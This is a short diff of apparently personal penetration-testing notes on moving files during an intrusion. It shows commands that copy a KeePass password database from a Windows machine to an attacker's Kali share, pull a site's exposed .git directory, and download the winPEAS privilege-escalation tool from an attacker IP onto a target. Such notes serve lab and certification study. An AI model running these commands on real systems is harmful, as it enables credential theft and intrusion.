@@ -141,12 +141,12 @@ windows:
 net use \\linuxIP\sharename
 copy Passwords.kdbx(windows filename) \\kali ip\sharename\Passwords.kdbx
 ```
-### Http
+### Http 
 ```
 wget url
 wget -r --no-parent http://192.168.188.144/.git/ #includes subdir and files
 
-curl url -o saved_file_path
+curl http://192.168.45.166:8000/winpeas.exe -o C:\users\hacker\winpeas.exe
 ```
 ### Evil-Winrm
 ```
